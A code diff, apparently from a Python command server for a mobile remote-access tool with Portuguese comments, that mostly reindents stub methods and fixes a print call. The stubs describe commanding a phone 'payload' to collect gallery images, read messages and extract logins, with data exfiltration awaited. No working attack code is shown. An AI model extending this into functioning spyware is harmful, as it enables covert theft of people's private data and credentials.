@@ -230,54 +230,54 @@ round-trip min/avg/max/stddev = 2.3/2.4/2.5/0.1 ms
         await asyncio.sleep(1)
         return output
     
-	@staticmethod
-	async def _execute_network_info() -> str:
-		"""Obtém informações de rede do dispositivo móvel"""
-		
-		output = """Network Information
-		===================
-		
-		Interface: wlan0
-		IP Address: 192.168.1.50
-		Subnet Mask: 255.255.255.0
-		Gateway: 192.168.1.1
-		DNS: 8.8.8.8, 8.8.4.4
-		MAC Address: 77:88:99:AA:BB:CC
-		Signal Strength: -65 dBm
-		Connected Network: LABORATORIO_EDUCACIONAL
-		
-		Interface: lo
-		IP Address: 127.0.0.1
-		        """
-		
-		return output
+    @staticmethod
+    async def _execute_network_info() -> str:
+        """Obtém informações de rede do dispositivo móvel"""
+        
+        output = """Network Information
+        ===================
+        
+        Interface: wlan0
+        IP Address: 192.168.1.50
+        Subnet Mask: 255.255.255.0
+        Gateway: 192.168.1.1
+        DNS: 8.8.8.8, 8.8.4.4
+        MAC Address: 77:88:99:AA:BB:CC
+        Signal Strength: -65 dBm
+        Connected Network: LABORATORIO_EDUCACIONAL
+        
+        Interface: lo
+        IP Address: 127.0.0.1
+                """
+        
+        return output
 
-	@staticmethod
-	async def _execute_get_gallery_images() -> str:
-		"""Envia comando para coleta de imagens e aguarda o resultado do payload real"""
-		
-		# Em um cenário real, este comando seria enviado via WebSocket ou API para o payload
-		# e o servidor aguardaria o payload enviar o resultado de volta.
-		
-		await asyncio.sleep(1) # Simula o tempo de envio do comando
-		
-		return "Comando de coleta de imagens enviado. Aguardando exfiltração de dados do payload..."
+    @staticmethod
+    async def _execute_get_gallery_images() -> str:
+        """Envia comando para coleta de imagens e aguarda o resultado do payload real"""
+        
+        # Em um cenário real, este comando seria enviado via WebSocket ou API para o payload
+        # e o servidor aguardaria o payload enviar o resultado de volta.
+        
+        await asyncio.sleep(1) # Simula o tempo de envio do comando
+        
+        return "Comando de coleta de imagens enviado. Aguardando exfiltração de dados do payload..."
 
-	@staticmethod
-	async def _execute_read_messages() -> str:
-		"""Envia comando para leitura de mensagens e aguarda o resultado do payload real"""
-		
-		await asyncio.sleep(1) # Simula o tempo de envio do comando
-		
-		return "Comando de leitura de mensagens enviado. Aguardando exfiltração de dados do payload..."
+    @staticmethod
+    async def _execute_read_messages() -> str:
+        """Envia comando para leitura de mensagens e aguarda o resultado do payload real"""
+        
+        await asyncio.sleep(1) # Simula o tempo de envio do comando
+        
+        return "Comando de leitura de mensagens enviado. Aguardando exfiltração de dados do payload..."
 
-	@staticmethod
-	async def _execute_extract_logins() -> str:
-		"""Envia comando para extração de logins e aguarda o resultado do payload real"""
-		
-		await asyncio.sleep(1) # Simula o tempo de envio do comando
-		
-		return "Comando de extração de logins enviado. Aguardando exfiltração de dados do payload..."
+    @staticmethod
+    async def _execute_extract_logins() -> str:
+        """Envia comando para extração de logins e aguarda o resultado do payload real"""
+        
+        await asyncio.sleep(1) # Simula o tempo de envio do comando
+        
+        return "Comando de extração de logins enviado. Aguardando exfiltração de dados do payload..."
 
 # ============================================================================
 # ROTAS DA API PARA INTEGRAÇÃO MÓVEL
@@ -379,7 +379,7 @@ if __name__ == "__main__":
     print("""    ⚡ INTEGRAÇÃO MÓVEL ⚡
     Gerenciamento de Dispositivos Móveis para Análise
     =================================================
-    """
+    """)
     
     # Exemplo de uso
     manager = MobileDeviceManager()
